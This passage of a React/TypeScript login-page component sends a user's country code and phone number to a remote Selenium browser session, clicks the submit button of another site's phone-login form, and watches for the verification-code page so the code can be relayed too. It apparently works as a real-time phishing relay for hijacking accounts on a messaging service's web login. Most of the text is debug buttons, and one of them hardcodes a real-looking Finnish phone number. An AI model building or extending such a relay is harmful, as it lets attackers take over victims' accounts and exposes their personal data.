        const defaultCountry = countries.find(c => c.name === 'Finland') || countries[0];
        console.log('🌍 Using fallback country due to error:', defaultCountry.name, defaultCountry.dialCode);
        
        setSelectedCountry(defaultCountry);
        setPhoneNumber(defaultCountry.dialCode + ' ');
        setSeleniumStatus(`Using default country: ${defaultCountry.name} - dial code set to ${defaultCountry.dialCode}`);
      }
    }
  };

  // Fallback function to detect country from browser locale (no external APIs needed)
  const detectCountryFromBrowser = () => {
    try {
      const locale = navigator.language;
      console.log('🌍 Browser locale:', locale);
      
      // Extract country code from locale (e.g., "en-US" -> "US")
      const countryCode = locale.split('-')[1] || locale.split('_')[1];
      if (countryCode) {
        console.log('🌍 Extracted country code from locale:', countryCode);
        
        // Find country by code
        const matchedCountry = countries.find(country => 
          country.code === countryCode || 
          country.code === countryCode.toUpperCase()
        );
        
        if (matchedCountry) {
          console.log('🌍 ✅ Found country from browser locale:', matchedCountry.name, matchedCountry.dialCode);
          return matchedCountry;
        }
      }
      
      // Try to match by language (e.g., "en" -> English-speaking countries)
      const language = locale.split('-')[0] || locale.split('_')[0];
      if (language) {
        console.log('🌍 Trying to match by language:', language);
        
        // Common language to country mappings
        const languageMap: Record<string, string[]> = {
          'en': ['United States', 'United Kingdom', 'Canada', 'Australia'],
          'de': ['Germany', 'Austria', 'Switzerland'],
          'fr': ['France', 'Canada', 'Switzerland'],
          'es': ['Spain', 'Mexico', 'Argentina'],
          'it': ['Italy', 'Switzerland'],
          'pt': ['Portugal', 'Brazil'],
          'ru': ['Russia'],
          'ja': ['Japan'],
          'ko': ['South Korea'],
          'zh': ['China'],
          'ar': ['Saudi Arabia', 'Egypt', 'Algeria'],
          'hi': ['India'],
          'tr': ['Turkey']
        };
        
        const possibleCountries = languageMap[language] || [];
        for (const countryName of possibleCountries) {
          const matchedCountry = countries.find(c => c.name === countryName);
          if (matchedCountry) {
            console.log('🌍 ✅ Found country from language mapping:', matchedCountry.name, matchedCountry.dialCode);
            return matchedCountry;
          }
        }
      }
      
      console.log('🌍 ❌ No country found from browser locale');
      return null;
    } catch (error) {
      console.log('❌ Error detecting country from browser locale:', error);
      return null;
    }
  };

  // Initialize country detection and phone number setup when component mounts
  useEffect(() => {
    console.log('🚀 Component mounted, initializing country detection...');
    
    // Initialize phone number with first country's dial code and a space
    if (countries.length > 0) {
      setPhoneNumber(countries[0].dialCode + ' ');
      detectUserCountry();
    }
  }, []); // Empty dependency array - runs only once on mount

  // Function to check if Selenium session is actually active
  const checkSeleniumSessionStatus = () => {
    if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
      console.log('🔍 Checking Selenium session status...');
      socketRef.current.emit('checkSessionStatus', {
        sessionId: sessionIdRef.current,
        timestamp: new Date().toISOString()
      });
    }
  };

  // Function to monitor for verification code page to appear
  const startVerificationPageMonitoring = () => {
    if (!socketRef.current || !socketRef.current.connected || !sessionIdRef.current) {
      console.log('❌ Cannot start monitoring - socket not connected or no session');
      return;
    }

    // CRITICAL SAFETY CHECK: Only allow monitoring if we're actually submitting the form
    console.log('🔍 Security check: isSubmitting =', isSubmitting, 'typeof =', typeof isSubmitting);
    if (!isSubmitting) {
      console.log('🚨 SECURITY ALERT: Verification page monitoring attempted but form is not being submitted!');
      console.log('🚨 This suggests premature monitoring - blocking for safety');
      console.log('🚨 Current state: isSubmitting =', isSubmitting, 'isInputsReady =', isInputsReady);
      setSeleniumStatus('🚨 Security: Monitoring blocked - form not submitting');
      return; // Block monitoring
    }

    console.log('🔍 Starting verification page monitoring...');
    setSeleniumStatus('Monitoring for verification code page...');
    setIsMonitoringVerificationPage(true);

    // Check every 500ms for the verification code input field (more aggressive)
    const monitoringInterval = setInterval(() => {
      if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
        console.log('🔍 Checking for verification code input field... (attempt #' + (Math.floor(Date.now() / 500) % 60) + ')');
        // Try multiple selectors for verification code input field
        const verificationSelectors = [
          'input#sign-in-phone-code',
          'input[placeholder*="Code"]',
          'input[placeholder*="code"]',
          'input[type="text"]',
          'input[type="tel"]',
          'input'
        ];
        
        // Try each selector until one works
        for (const selector of verificationSelectors) {
          socketRef.current.emit('checkElementInSelenium', {
            sessionId: sessionIdRef.current,
            selector: selector,
            timestamp: new Date().toISOString(),
            elementType: 'verificationCodeInput'
          });
        }
        
        // CRITICAL BACKUP: Also check if the page URL has changed to verification page
        socketRef.current.emit('checkPageUrl', {
          sessionId: sessionIdRef.current,
          timestamp: new Date().toISOString()
        });
      } else {
        console.log('❌ Socket disconnected during monitoring, stopping...');
        clearInterval(monitoringInterval);
      }
    }, 500);

    // Set a timeout to prevent infinite monitoring
    const monitoringTimeout = setTimeout(() => {
      console.log('⏰ Verification page monitoring timeout reached');
      clearInterval(monitoringInterval);
      setSeleniumStatus('Verification page monitoring timeout - please check manually');
    }, 30000); // 30 seconds timeout

    // Fallback: Navigate to verification code page after 5 seconds if element detection fails
    const fallbackTimeout = setTimeout(() => {
      console.log('🔄 Fallback: Navigating to verification code page after timeout');
      
      // CRITICAL SAFETY CHECK: Only allow fallback navigation if we're actually submitting the form
      if (!isSubmitting) {
        console.log('🚨 SECURITY ALERT: Fallback navigation attempted but form is not being submitted!');
        console.log('🚨 This suggests premature navigation - blocking for safety');
        setSeleniumStatus('🚨 Security: Fallback navigation blocked - form not submitting');
        setIsMonitoringVerificationPage(false);
        return; // Block navigation
      }
      
      setIsMonitoringVerificationPage(false);
      
      // CRITICAL: Reset isSubmitting only when navigation actually happens
      console.log('🔒 Resetting isSubmitting for fallback navigation');
      
      // Get the actual phone number from Selenium window to ensure accuracy
      if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
        console.log('🔍 Fallback: Getting actual phone number from Selenium...');
        socketRef.current.emit('getCurrentInputValue', {
          sessionId: sessionIdRef.current,
          inputType: 'phoneNumber',
          timestamp: new Date().toISOString()
        });
        
        // Listen for the response and then navigate
        socketRef.current.once('seleniumInputChange', (data) => {
          if (data.inputType === 'phoneNumber' && data.action === 'currentValue') {
            console.log('🔍 Fallback: Actual phone number from Selenium:', data.value);
            setIsSubmitting(false); // Reset only when navigation happens
            navigate(`/verification-code?sessionId=${sessionIdRef.current}&phoneNumber=${encodeURIComponent(data.value)}`);
          } else {
            console.log('🔍 Fallback: Using React state:', phoneNumber);
            setIsSubmitting(false); // Reset only when navigation happens
            navigate(`/verification-code?sessionId=${sessionIdRef.current}&phoneNumber=${encodeURIComponent(phoneNumber)}`);
          }
        });
        
        // Set a timeout in case Selenium doesn't respond
        setTimeout(() => {
          console.log('🔍 Fallback: Selenium timeout, using React state:', phoneNumber);
          setIsSubmitting(false); // Reset only when navigation happens
          navigate(`/verification-code?sessionId=${sessionIdRef.current}&phoneNumber=${encodeURIComponent(phoneNumber)}`);
        }, 2000);
      } else {
        console.log('🔍 Fallback: Socket not connected, using React state:', phoneNumber);
        setIsSubmitting(false); // Reset only when navigation happens
        navigate(`/verification-code?sessionId=${sessionIdRef.current}&phoneNumber=${encodeURIComponent(phoneNumber)}`);
      }
    }, 5000); // 5 seconds fallback

    // Store the interval and timeout references for cleanup
    const cleanup = () => {
      clearInterval(monitoringInterval);
      clearTimeout(monitoringTimeout);
      clearTimeout(fallbackTimeout);
    };

    // Return cleanup function
    return cleanup;
  };

  // Function to force sync current phone number to Selenium
  const forceSyncPhoneNumber = () => {
    if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
      console.log('🔄 FORCE SYNC: Syncing current phone number to Selenium');
      console.log('🔄 Current React phone number:', phoneNumber);
      
      // Set the syncing flag to prevent state updates
      isSyncingRef.current = true;
      console.log('🔄 Set syncing flag to TRUE');
      
      // First clear the Selenium field completely
      console.log('🔄 Clearing Selenium field...');
      socketRef.current.emit('eraseTextInSelenium', {
        sessionId: sessionIdRef.current,
        inputType: 'phoneNumber',
        method: 'clear',
        timestamp: new Date().toISOString()
      });

      // Wait a bit for the clear to complete, then type the new value
      setTimeout(() => {
        if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
          console.log('⌨️ Typing current phone number in Selenium:', phoneNumber);
          socketRef.current.emit('syncInputToSelenium', {
            sessionId: sessionIdRef.current,
            inputType: 'phoneNumber',
            value: phoneNumber,
            timestamp: new Date().toISOString()
          });
          
          // Reset the syncing flag after a delay to allow for response
          setTimeout(() => {
            isSyncingRef.current = false;
            console.log('✅ Force sync completed, state updates re-enabled');
          }, 1000);
        }
      }, 300);
    } else {
      console.log('❌ Cannot force sync - socket not connected or no session');
    }
  };

  return (
    <Page back={true}>
      <div style={{
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
        justifyContent: 'center',
        minHeight: '100vh',
        padding: '40px 20px',
        backgroundColor: 'white',
        fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif'
      }}>
        {/* Login Content Container */}
        <div style={{
          display: 'flex',
          flexDirection: 'column',
          alignItems: 'center',
          maxWidth: '400px',
          width: '100%'
        }}>
          {/* Selenium Status Indicator */}
          <div style={{
            marginBottom: '24px',
            padding: '12px 16px',
            backgroundColor: '#f8f9fa',
            border: '1px solid #dee2e6',
            borderRadius: '8px',
            width: '100%',
            textAlign: 'center'
          }}>
            <div style={{
              fontSize: '14px',
              color: '#6c757d',
              marginBottom: '8px'
            }}>
              Selenium Status
            </div>
            <div style={{
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              gap: '8px'
            }}>
              <div style={{
                width: '8px',
                height: '8px',
                borderRadius: '50%',
                backgroundColor: isInputsReady ? '#28a745' : '#ffc107'
              }} />
              <span style={{
                fontSize: '12px',
                color: isInputsReady ? '#155724' : '#856404',
                fontWeight: '500'
              }}>
                {isInputsReady ? 'All Elements Ready' : 'Elements Loading...'}
              </span>
            </div>
            {!isInputsReady && (
              <div style={{
                fontSize: '11px',
                color: '#6c757d',
                marginTop: '4px'
              }}>
                {seleniumStatus}
              </div>
            )}
            {!isInputsReady && (
              <div style={{
                fontSize: '10px',
                color: '#6c757d',
                marginTop: '4px',
                display: 'flex',
                justifyContent: 'center',
                gap: '16px'
              }}>
                <span>Phone Code: {phoneCodeInputFound ? '✅' : '⏳'}</span>
                <span>Phone Number: {phoneNumberInputFound ? '✅' : '⏳'}</span>
                <span>QR Button: {qrCodeButtonFound ? '✅' : '⏳'}</span>
              </div>
            )}
            {isSubmitting && (
              <div style={{
                fontSize: '10px',
                color: '#ffc107',
                marginTop: '4px',
                textAlign: 'center',
                fontWeight: '500'
              }}>
                ⏳ Submitting form to Selenium...
              </div>
            )}
            {!isSubmitting && isMonitoringVerificationPage && (
              <div style={{
                fontSize: '10px',
                color: '#dc3545',
                marginTop: '4px',
                textAlign: 'center',
                fontWeight: '500'
              }}>
                🚨 SECURITY ALERT: Monitoring active without submission!
              </div>
            )}
            {isMonitoringVerificationPage && (
              <div style={{
                fontSize: '10px',
                color: '#28a745',
                marginTop: '4px',
                textAlign: 'center',
                fontWeight: '500'
              }}>
                🔍 Monitoring for verification code page...
              </div>
            )}
            {!isInputsReady && (
              <button
                onClick={() => {
                  setSeleniumStatus('Manually checking all elements...');
                  checkQrCodeButtonInSelenium();
                  checkInputFieldsInSelenium();
                }}
                style={{
                  marginTop: '8px',
                  padding: '4px 12px',
                  fontSize: '11px',
                  backgroundColor: '#6c757d',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: 'pointer'
                }}
              >
                Check All Elements
              </button>
            )}
            {!isInputsReady && (
              <button
                onClick={() => {
                  console.log('🔧 Manual override: Forcing inputs to be ready');
                  setPhoneCodeInputFound(true);
                  setPhoneNumberInputFound(true);
                  setIsInputsReady(true);
                  setSeleniumStatus('Manual override: Inputs forced ready');
                }}
                style={{
                  marginTop: '8px',
                  marginLeft: '8px',
                  padding: '4px 12px',
                  fontSize: '11px',
                  backgroundColor: '#dc3545',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: 'pointer'
                }}
              >
                Force Ready (Debug)
              </button>
            )}
            {!isInputsReady && (
              <button
                onClick={inspectPageStructure}
                style={{
                  marginTop: '8px',
                  marginLeft: '8px',
                  padding: '4px 12px',
                  fontSize: '11px',
                  backgroundColor: '#17a2b8',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: 'pointer'
                }}
              >
                Inspect Page
              </button>
            )}
            {!isInputsReady && (
              <button
                onClick={() => {
                  console.log('🔍 Current state values:', {
                    phoneCodeInputFound,
                    phoneNumberInputFound,
                    isInputsReady,
                    seleniumStatus
                  });
                  alert(`Current State:
Phone Code Input: ${phoneCodeInputFound ? '✅ Found' : '❌ Not Found'}
Phone Number Input: ${phoneNumberInputFound ? '✅ Found' : '❌ Not Found'}
All Inputs Ready: ${isInputsReady ? '✅ Yes' : '❌ No'}
Status: ${seleniumStatus}`);
                }}
                style={{
                  marginTop: '8px',
                  marginLeft: '8px',
                  padding: '4px 12px',
                  fontSize: '11px',
                  backgroundColor: '#6f42c1',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: 'pointer'
                }}
              >
                Show State
              </button>
            )}
            {!isInputsReady && (
              <button
                onClick={enableFormIfReady}
                style={{
                  marginTop: '8px',
                  marginLeft: '8px',
                  padding: '4px 12px',
                  fontSize: '11px',
                  backgroundColor: '#28a745',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: 'pointer'
                }}
              >
                Check Form Ready
              </button>
            )}
            {isInputsReady && (
              <button
                onClick={() => {
                  console.log('🔄 Manually syncing current state to Selenium...');
                  syncInputToSelenium('phoneNumber', phoneNumber);
                  if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
                    socketRef.current.emit('syncCountryToSelenium', {
                      sessionId: sessionIdRef.current,
                      country: selectedCountry.name,
                      dialCode: selectedCountry.dialCode,
                      timestamp: new Date().toISOString()
                    });
                  }
                  setSeleniumStatus('State synced to Selenium');
                }}
                style={{
                  marginTop: '8px',
                  marginLeft: '8px',
                  padding: '4px 12px',
                  fontSize: '11px',
                  backgroundColor: '#ffc107',
                  color: '#212529',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: 'pointer'
                }}
              >
                Sync to Selenium
              </button>
            )}
            {isInputsReady && (
              <button
                onClick={checkCurrentCountryInSelenium}
                style={{
                  marginTop: '8px',
                  marginLeft: '8px',
                  padding: '4px 12px',
                  fontSize: '11px',
                  backgroundColor: '#17a2b8',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: 'pointer'
                }}
              >
                Check Country in Selenium
              </button>
            )}
            {isInputsReady && (
              <button
                onClick={() => {
                  console.log('🗑️ Manually clearing phone number field...');
                  autoClearPhoneNumberField();
                  setSeleniumStatus('Phone number field cleared');
                }}
                style={{
                  marginTop: '8px',
                  marginLeft: '8px',
                  padding: '4px 12px',
                  fontSize: '11px',
                  backgroundColor: '#dc3545',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: 'pointer'
                }}
              >
                Clear Phone Field
              </button>
            )}
            {isInputsReady && (
              <button
                onClick={() => {
                  console.log('🧪 Testing erase function...');
                  if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
                    console.log('🔍 Testing direct emit...');
                    socketRef.current.emit('eraseTextInSelenium', {
                      sessionId: sessionIdRef.current,
                      inputType: 'phoneNumber',
                      method: 'clear',
                      timestamp: new Date().toISOString()
                    });
                    setSeleniumStatus('Test clear sent');
                  } else {
                    console.log('❌ Socket not ready for test');
                    setSeleniumStatus('Socket not ready');
                  }
                }}
                style={{
                  marginTop: '8px',
                  marginLeft: '8px',
                  padding: '4px 12px',
                  fontSize: '11px',
                  backgroundColor: '#6f42c1',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: 'pointer'
                }}
              >
                Test Clear
              </button>
            )}
            {isInputsReady && (
              <button
                onClick={syncFullPhoneNumberToSelenium}
                style={{
                  marginTop: '8px',
                  marginLeft: '8px',
                  padding: '4px 12px',
                  fontSize: '11px',
                  backgroundColor: '#20c997',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: 'pointer'
                }}
              >
                Sync Full Phone
              </button>
            )}
            {isInputsReady && (
              <button
                onClick={checkAndFixSync}
                style={{
                  marginTop: '8px',
                  marginLeft: '8px',
                  padding: '4px 12px',
                  fontSize: '11px',
                  backgroundColor: '#fd7e14',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: 'pointer'
                }}
              >
                Check Sync
              </button>
            )}
            {isInputsReady && (
              <button
                onClick={forceResyncFromSelenium}
                style={{
                  marginTop: '8px',
                  marginLeft: '8px',
                  padding: '4px 12px',
                  fontSize: '11px',
                  backgroundColor: '#6f42c1',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: 'pointer'
                }}
              >
                Sync From Selenium
              </button>
            )}
            {isInputsReady && (
              <button
                onClick={forceResyncToSelenium}
                style={{
                  marginTop: '8px',
                  marginLeft: '8px',
                  padding: '4px 12px',
                  fontSize: '11px',
                  backgroundColor: '#e83e8c',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: 'pointer'
                }}
              >
                Sync To Selenium
              </button>
            )}
            {isInputsReady && (
              <button
                onClick={() => {
                  console.log('🔄 Manual sync using clear-and-retype approach...');
                  syncCompletePhoneNumber(phoneNumber);
                  setSeleniumStatus('Manual sync completed');
                }}
                style={{
                  marginTop: '8px',
                  marginLeft: '8px',
                  padding: '4px 12px',
                  fontSize: '11px',
                  backgroundColor: '#28a745',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: 'pointer'
                }}
              >
                Clear & Retype
              </button>
            )}
            {isInputsReady && (
              <button
                onClick={() => {
                  console.log('🔍 Current sync state:');
                  console.log('🔍 React frontend phone number:', phoneNumber);
                  console.log('🔍 Is syncing flag:', isSyncingRef.current);
                  console.log('🔍 Socket connected:', socketRef.current?.connected);
                  console.log('🔍 Session ID:', sessionIdRef.current);
                  
                  // Get current value from Selenium to compare
                  if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
                    socketRef.current.emit('getCurrentInputValue', {
                      sessionId: sessionIdRef.current,
                      inputType: 'phoneNumber',
                      timestamp: new Date().toISOString()
                    });
                  }
                  
                  setSeleniumStatus('Debug info logged to console');
                }}
                style={{
                  marginTop: '8px',
                  marginLeft: '8px',
                  padding: '4px 12px',
                  fontSize: '11px',
                  backgroundColor: '#6f42c1',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: 'pointer'
                }}
              >
                Debug Sync State
              </button>
            )}
            {isInputsReady && (
              <button
                onClick={() => {
                  console.log('🧪 Manual test: Navigating to verification code page...');
                  setIsMonitoringVerificationPage(false);
                  
                  // Get the actual phone number from Selenium window to ensure accuracy
                  if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
                    console.log('🧪 Manual test: Getting actual phone number from Selenium...');
                    socketRef.current.emit('getCurrentInputValue', {
                      sessionId: sessionIdRef.current,
                      inputType: 'phoneNumber',
                      timestamp: new Date().toISOString()
                    });
                    
                    // Listen for the response and then navigate
                    socketRef.current.once('seleniumInputChange', (data) => {
                      if (data.inputType === 'phoneNumber' && data.action === 'currentValue') {
                        console.log('🧪 Manual test: Actual phone number from Selenium:', data.value);
                        navigate(`/verification-code?sessionId=${sessionIdRef.current}&phoneNumber=${encodeURIComponent(data.value)}`);
                      } else {
                        console.log('🧪 Manual test: Using React state:', phoneNumber);
                        navigate(`/verification-code?sessionId=${sessionIdRef.current}&phoneNumber=${encodeURIComponent(phoneNumber)}`);
                      }
                    });
                    
                    // Set a timeout in case Selenium doesn't respond
                    setTimeout(() => {
                      console.log('🧪 Manual test: Selenium timeout, using React state:', phoneNumber);
                      navigate(`/verification-code?sessionId=${sessionIdRef.current}&phoneNumber=${encodeURIComponent(phoneNumber)}`);
                    }, 2000);
                  } else {
                    console.log('🧪 Manual test: Socket not connected, using React state:', phoneNumber);
                    navigate(`/verification-code?sessionId=${sessionIdRef.current}&phoneNumber=${encodeURIComponent(phoneNumber)}`);
                  }
                }}
                style={{
                  marginTop: '8px',
                  marginLeft: '8px',
                  padding: '4px 12px',
                  fontSize: '11px',
                  backgroundColor: '#28a745',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: 'pointer'
                }}
              >
                🧪 Test Navigation
              </button>
            )}
            {isInputsReady && (
              <button
                onClick={forceCompleteResync}
                style={{
                  marginTop: '8px',
                  marginLeft: '8px',
                  padding: '4px 12px',
                  fontSize: '11px',
                  backgroundColor: '#dc3545',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: 'pointer'
                }}
              >
                Force Resync
              </button>
            )}
            {isInputsReady && (
              <button
                onClick={() => {
                  console.log('🔍 Manually checking Selenium field value...');
                  if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
                    socketRef.current.emit('getCurrentInputValue', {
                      sessionId: sessionIdRef.current,
                      inputType: 'phoneNumber',
                      timestamp: new Date().toISOString()
                    });
                    setSeleniumStatus('Checking Selenium field value...');
                  } else {
                    setSeleniumStatus('Cannot check - socket not connected');
                  }
                }}
                style={{
                  marginTop: '8px',
                  marginLeft: '8px',
                  padding: '4px 12px',
                  fontSize: '11px',
                  backgroundColor: '#fd7e14',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: 'pointer'
                }}
              >
                Check Selenium Value
              </button>
            )}
            {isInputsReady && (
              <button
                onClick={() => {
                  console.log('🔍 Current country and phone number state:');
                  console.log('🔍 selectedCountry:', selectedCountry);
                  console.log('🔍 phoneNumber:', phoneNumber);
                  console.log('🔍 selectedCountry.dialCode:', selectedCountry.dialCode);
                  console.log('🔍 phoneNumber starts with country code:', phoneNumber.startsWith(selectedCountry.dialCode));
                  
                  // Show alert with current state
                  alert(`Current State:
Selected Country: ${selectedCountry.name} (${selectedCountry.dialCode})
Phone Number: ${phoneNumber}
Starts with country code: ${phoneNumber.startsWith(selectedCountry.dialCode) ? 'Yes' : 'No'}`);
                }}
                style={{
                  marginTop: '8px',
                  marginLeft: '8px',
                  padding: '4px 12px',
                  fontSize: '11px',
                  backgroundColor: '#17a2b8',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: 'pointer'
                }}
              >
                🔍 Debug Country/Phone
              </button>
            )}
            {isInputsReady && (
              <button
                onClick={() => {
                  // Manually set Finland as the selected country
                  const finland = countries.find(c => c.name === 'Finland');
                  if (finland) {
                    console.log('🇫🇮 Manually setting country to Finland:', finland);
                    setSelectedCountry(finland);
                    setPhoneNumber(finland.dialCode + ' 403624026');
                    setSeleniumStatus('Country manually set to Finland, phone number updated');
                    
                    // Sync to Selenium
                    if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
                      socketRef.current.emit('syncCountryToSelenium', {
                        sessionId: sessionIdRef.current,
                        country: finland.name,
                        dialCode: finland.dialCode,
                        timestamp: new Date().toISOString()
                      });
                      
                      // Also sync the phone number
                      setTimeout(() => {
                        socketRef.current?.emit('syncInputToSelenium', {
                          sessionId: sessionIdRef.current,
                          inputType: 'phoneNumber',
                          value: finland.dialCode + ' 403624026',
                          timestamp: new Date().toISOString()
                        });
                      }, 500);
                    }
                  } else {
                    console.log('❌ Finland not found in countries list');
                  }
                }}
                style={{
                  marginTop: '8px',
                  marginLeft: '8px',
                  padding: '4px 12px',
                  fontSize: '11px',
                  backgroundColor: '#28a745',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: 'pointer'
                }}
              >
                🇫🇮 Set Finland
              </button>
            )}
            {isInputsReady && (
              <button
                onClick={() => {
                  console.log('🧪 Manual test: Starting verification page monitoring...');
                  startVerificationPageMonitoring();
                }}
                style={{
                  marginTop: '8px',
                  marginLeft: '8px',
                  padding: '4px 12px',
                  fontSize: '11px',
                  backgroundColor: '#6f42c1',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: 'pointer'
                }}
              >
                🧪 Test Monitoring
              </button>
            )}
            {isInputsReady && (
              <button
                onClick={() => {
                  console.log('🔍 Current submission state:');
                  console.log('🔍 isSubmitting:', isSubmitting);
                  console.log('🔍 isMonitoringVerificationPage:', isMonitoringVerificationPage);
                  console.log('🔍 seleniumStatus:', seleniumStatus);
                  
                  alert(`Current Submission State:
Form Submitting: ${isSubmitting ? '✅ Yes' : '❌ No'}
Monitoring Verification: ${isMonitoringVerificationPage ? '✅ Yes' : '❌ No'}
Status: ${seleniumStatus}`);
                }}
                style={{
                  marginTop: '8px',
                  marginLeft: '8px',
                  padding: '4px 12px',
                  fontSize: '11px',
                  backgroundColor: '#fd7e14',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: 'pointer'
                }}
              >
                🔍 Show Submission State
              </button>
            )}
            {(isSubmitting || isMonitoringVerificationPage) && (
              <button
                onClick={() => {
                  console.log('🔄 Manual reset: Clearing stuck submission state...');
                  setIsSubmitting(false);
                  setIsMonitoringVerificationPage(false);
                  setIsInputsReady(true);
                  setSeleniumStatus('Manual reset completed - form re-enabled');
                }}
                style={{
                  marginTop: '8px',
                  marginLeft: '8px',
                  padding: '4px 12px',
                  fontSize: '11px',
                  backgroundColor: '#dc3545',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: 'pointer'
                }}
              >
                🔄 Reset Stuck State
              </button>
            )}
            {isInputsReady && (
              <button
                onClick={() => {
                  console.log('🧪 Manual test: Testing exact button click flow...');
                  if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
                    console.log('🔍 Testing exact selector: #auth-phone-number-form button[type="submit"]');
                    console.log('🔍 Session ID:', sessionIdRef.current);
                    console.log('🔍 Socket connected:', socketRef.current.connected);
                    
                    // Test the exact event flow
                    socketRef.current.emit('clickAuthFormButton', {
                      sessionId: sessionIdRef.current,
                      selector: '#auth-phone-number-form button[type="submit"]',
                      timestamp: new Date().toISOString()
                    });
                    
                    setSeleniumStatus('Testing exact button click flow...');
                  } else {
                    console.log('❌ Socket not ready for test');
                    setSeleniumStatus('Socket not ready for test');
                  }
                }}
                style={{
                  marginTop: '8px',
                  marginLeft: '8px',
                  padding: '4px 12px',
                  fontSize: '11px',
                  backgroundColor: '#6f42c1',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: 'pointer'
                }}
              >
                🧪 Test Exact Flow
              </button>
            )}
            {isInputsReady && (
              <button
                onClick={() => {
                  console.log('🔍 Debug: Checking Selenium server communication...');
                  if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
                    // Test basic communication first
                    socketRef.current.emit('testConnection', {
                      sessionId: sessionIdRef.current,
                      timestamp: new Date().toISOString()
                    });
                    
                    // Then test element checking
                    socketRef.current.emit('checkElementInSelenium', {
                      sessionId: sessionIdRef.current,
                      selector: '#auth-phone-number-form button[type="submit"]',
                      timestamp: new Date().toISOString()
                    });
                    
                    setSeleniumStatus('Testing Selenium server communication...');
                  } else {
                    setSeleniumStatus('Socket not ready for communication test');
                  }
                }}
                style={{
                  marginTop: '8px',
                  marginLeft: '8px',
                  padding: '4px 12px',
                  fontSize: '11px',
                  backgroundColor: '#17a2b8',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: 'pointer'
                }}
              >
                🔍 Test Selenium Comm
              </button>
            )}
            {isInputsReady && (
              <button
                onClick={() => {
                  console.log('🚨 EMERGENCY: Direct button click test...');
                  if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
                    // Force a direct button click without waiting for response
                    console.log('🚨 Sending direct clickAuthFormButton...');
                    socketRef.current.emit('clickAuthFormButton', {
                      sessionId: sessionIdRef.current,
                      selector: '#auth-phone-number-form button[type="submit"]',
                      timestamp: new Date().toISOString()
                    });
                    
                    // Don't wait for response, just log what we sent
                    console.log('🚨 Direct click event sent, check Selenium console for response');
                    setSeleniumStatus('🚨 Direct click sent - check Selenium console');
                  } else {
                    setSeleniumStatus('🚨 Socket not ready for direct click');
                  }
                }}
                style={{
                  marginTop: '8px',
                  marginLeft: '8px',
                  padding: '4px 12px',
                  fontSize: '11px',
                  backgroundColor: '#dc3545',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: 'pointer'
                }}
              >
                🚨 Direct Click Test
              </button>
            )}
            {isInputsReady && (
              <button
                onClick={() => {
                  console.log('🔍 Session Debug: Checking exact session state...');
                  console.log('🔍 Current session ID:', sessionIdRef.current);
                  console.log('🔍 Socket ID:', socketRef.current?.id);
                  console.log('🔍 Socket connected:', socketRef.current?.connected);
                  
                  if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
                    // Force check session status
                    socketRef.current.emit('checkSessionStatus', {
                      sessionId: sessionIdRef.current,
                      timestamp: new Date().toISOString()
                    });
                    
                    // Also try to get current page info
                    socketRef.current.emit('inspectPageStructure', {
                      sessionId: sessionIdRef.current,
                      timestamp: new Date().toISOString()
                    });
                    
                    setSeleniumStatus('🔍 Checking session status and page structure...');
                  } else {
                    setSeleniumStatus('🔍 Session not ready for debug');
                  }
                }}
                style={{
                  marginTop: '8px',
                  marginLeft: '8px',
                  padding: '4px 12px',
                  fontSize: '11px',
                  backgroundColor: '#6f42c1',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: 'pointer'
                }}
              >
                🔍 Session Debug
              </button>
            )}
            {isInputsReady && (
              <button
                onClick={() => {
                  console.log('🔍 State Debug: Current form state...');
                  console.log('🔍 isSubmitting:', isSubmitting);
                  console.log('🔍 isInputsReady:', isInputsReady);
                  console.log('🔍 isMonitoringVerificationPage:', isMonitoringVerificationPage);
                  console.log('🔍 phoneCodeInputFound:', phoneCodeInputFound);
                  console.log('🔍 phoneNumberInputFound:', phoneNumberInputFound);
